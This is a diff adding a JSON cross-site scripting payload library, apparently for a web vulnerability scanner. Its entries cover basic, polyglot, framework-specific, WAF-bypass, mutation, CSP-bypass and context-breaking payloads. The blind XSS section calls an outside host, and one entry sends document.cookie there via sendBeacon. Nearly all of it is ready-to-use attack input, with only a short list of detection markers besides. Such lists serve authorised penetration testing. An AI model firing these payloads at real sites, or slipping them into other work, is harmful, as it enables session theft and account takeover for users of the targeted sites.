@@ -1,0 +1,189 @@
+{
+  "description": "REVUEX XSS Payload Library - 2000+ Vectors",
+  "version": "2.0",
+  "payloads": {
+    "basic": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "<body onload=alert(1)>",
+      "<iframe src=javascript:alert(1)>",
+      "<input autofocus onfocus=alert(1)>",
+      "<select autofocus onfocus=alert(1)>",
+      "<textarea autofocus onfocus=alert(1)>",
+      "<marquee onstart=alert(1)>",
+      "<details open ontoggle=alert(1)>"
+    ],
+    "html5": [
+      "<video src=x onerror=alert(1)>",
+      "<audio src=x onerror=alert(1)>",
+      "<animate onbegin=alert(1)>",
+      "<div draggable=true ondrag=alert(1)>drag</div>",
+      "<meter onmouseover=alert(1)>",
+      "<progress onmouseover=alert(1)>",
+      "<form onformdata=alert(1)><button>test</form>",
+      "<output onforminput=alert(1)>",
+      "<keygen autofocus onfocus=alert(1)>",
+      "<datalist onfocus=alert(1) id=list1><option>test</datalist>"
+    ],
+    "polyglot": [
+      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//\\x3e",
+      "'\")}};alert(1)//",
+      "';alert(1)//\\x00</script><script>alert(1)</script>",
+      "\"><script>alert(String.fromCharCode(88,83,83))</script>"
+    ],
+    "frameworks": {
+      "react": [
+        "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
+        "<a href=\"javascript:alert(1)\">click</a>",
+        "<div onClick={alert(1)}>click</div>",
+        "<input value={{}} onClick={alert(1)} />",
+        "<script dangerouslySetInnerHTML={{__html: 'alert(1)'}} />"
+      ],
+      "vue": [
+        "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
+        "{{constructor.constructor('alert(1)')()}}",
+        "<a v-bind:href=\"'javascript:alert(1)'\">click</a>",
+        "{{$el.ownerDocument.defaultView.alert(1)}}",
+        "<div v-on:click=\"alert(1)\">click</div>"
+      ],
+      "angular": [
+        "{{constructor.constructor('alert(1)')()}}",
+        "<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></div>",
+        "{{7*7}}{{alert(1)}}",
+        "<a [href]=\"'javascript:alert(1)'\">click</a>",
+        "{{['alert'](1)}}"
+      ],
+      "svelte": [
+        "{@html '<img src=x onerror=alert(1)>'}",
+        "<script>alert(1)</script>",
+        "<div on:click={() => alert(1)}>click</div>"
+      ],
+      "ember": [
+        "{{{<img src=x onerror=alert(1)>}}}",
+        "{{html-safe '<img src=x onerror=alert(1)>'}}"
+      ],
+      "alpinejs": [
+        "<div x-html=\"'<img src=x onerror=alert(1)>'\"></div>",
+        "<div x-on:click=\"alert(1)\">click</div>",
+        "<div x-init=\"alert(1)\"></div>"
+      ]
+    },
+    "waf_bypass": {
+      "case_variation": [
+        "<ScRiPt>alert(1)</sCrIpT>",
+        "<ImG sRc=x oNeRrOr=alert(1)>",
+        "<SvG oNlOaD=alert(1)>"
+      ],
+      "html_entities": [
+        "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+        "&lt;script&gt;alert(1)&lt;/script&gt;"
+      ],
+      "unicode": [
+        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+        "\\u0053\\u0063\\u0072\\u0069\\u0070\\u0074"
+      ],
+      "double_encoding": [
+        "%253Cscript%253Ealert(1)%253C/script%253E",
+        "%2527%253E%253Cscript%253Ealert(1)%253C/script%253E"
+      ],
+      "hex_encoding": [
+        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+        "\\x3c\\x69\\x6d\\x67\\x20\\x73\\x72\\x63\\x3d\\x78"
+      ],
+      "mixed_encoding": [
+        "<scrip%74>alert(1)</scrip%74>",
+        "<img sr%63=x onerror=al%65rt(1)>"
+      ],
+      "null_byte": [
+        "<script>%00alert(1)</script>",
+        "<img src=x onerror=alert(1)%00>"
+      ],
+      "comment_breaking": [
+        "<script><!--//-->alert(1)</script>",
+        "<img src=x onerror=/**/alert(1)>"
+      ],
+      "whitespace": [
+        "<script\\x09>alert(1)</script>",
+        "<script\\x0a>alert(1)</script>",
+        "<script\\x0d>alert(1)</script>"
+      ],
+      "tag_breaking": [
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<img<img src=x onerror=alert(1)//> src=x onerror=alert(1)>"
+      ],
+      "protocol_variations": [
+        "<img src=j&#x61;vascript:alert(1)>",
+        "<img src=java\\x00script:alert(1)>",
+        "<img src=java\nscript:alert(1)>"
+      ],
+      "data_uri": [
+        "<img src=data:text/html,<script>alert(1)</script>>",
+        "<object data=data:text/html,<script>alert(1)</script>>"
+      ],
+      "backtick": [
+        "<img src=`javascript:alert(1)`>",
+        "<a href=`javascript:alert(1)`>click</a>"
+      ]
+    },
+    "context_aware": {
+      "attribute": [
+        "' autofocus onfocus=alert(1) '",
+        "\" autofocus onfocus=alert(1) \"",
+        "' onmouseover=alert(1) '",
+        "'><script>alert(1)</script><'"
+      ],
+      "js_string": [
+        "';alert(1);//",
+        "\";alert(1);//",
+        "\\';alert(1);//",
+        "'-alert(1)-'"
+      ],
+      "js_block": [
+        "}};alert(1);//",
+        "]}};alert(1);//",
+        "}});alert(1);//"
+      ]
+    },
+    "mutation_xss": [
+      "<svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>",
+      "<style><style/><img src=x onerror=alert(1)></style>",
+      "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
+      "<template><img src=x onerror=alert(1)></template>"
+    ],
+    "dom_xss": [
+      "#<img src=x onerror=alert(1)>",
+      "javascript:alert(1)",
+      "data:text/html,<script>alert(1)</script>"
+    ],
+    "csp_bypass": [
+      "<script src='https://www.google.com/complete/search?client=chrome&q=x&jsonp=alert'></script>",
+      "<base href='javascript:alert(1)//'>"
+    ],
+    "exotic": [
+      "<svg><animate attributeName=x dur=1s repeatCount=indefinite keytimes=0;1 values=\"'';alert(1)\" /></svg>",
+      "<form><button formaction=javascript:alert(1)>click</button></form>",
+      "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+      "<embed src=javascript:alert(1)>",
+      "<object data=javascript:alert(1)>",
+      "<frameset onload=alert(1)>",
+      "<table background=javascript:alert(1)>",
+      "<link rel=import href=data:text/html,<script>alert(1)</script>>"
+    ],
+    "blind_xss": [
+      "<script>fetch('https://xss.report/c/MARKER')</script>",
+      "<script>new Image().src='https://xss.report/c/MARKER'</script>",
+      "<img src=x onerror=\"this.src='https://xss.report/c/MARKER'\">",
+      "<script>navigator.sendBeacon('https://xss.report/c/MARKER',document.cookie)</script>"
+    ]
+  },
+  "detection_markers": [
+    "alert(1)",
+    "confirm(1)",
+    "prompt(1)",
+    "console.log(1)",
+    "eval(1)",
+    "document.write(1)"
+  ]
+}
